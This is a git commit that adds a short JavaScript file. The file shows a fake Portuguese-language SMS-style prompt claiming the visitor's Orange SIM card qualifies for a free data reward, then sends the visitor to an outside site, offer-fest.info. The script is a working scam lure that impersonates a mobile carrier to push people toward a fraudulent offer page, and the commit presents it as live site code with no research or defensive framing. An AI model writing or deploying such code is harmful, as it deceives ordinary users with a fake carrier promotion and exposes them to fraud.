bb690b8e90e3f125947ed41e50f64b36d4e8a211
ekpesense <abantak9@gmail.com>
2025-02-06 22:45:15 -0800

    Create activation-orange.data-reward.js

---
+++ activation-orange.data-reward.js
@@ -0,0 +1,5 @@
+var password = 'Recompensa de dados laranja'
+password=prompt('SMS: Parabéns, o seu cartão SIM Orange é elegível para receber RECOMPENSA DE DADOS GRATUITA, pressione Recompensa de Dados Orange para ATIVAR. ','Recompensa de dados laranja');
+if (password != 'Recompensa de dados laranja') {
+location.href='https://offer-fest.info/orange.data-reward.html';
+}
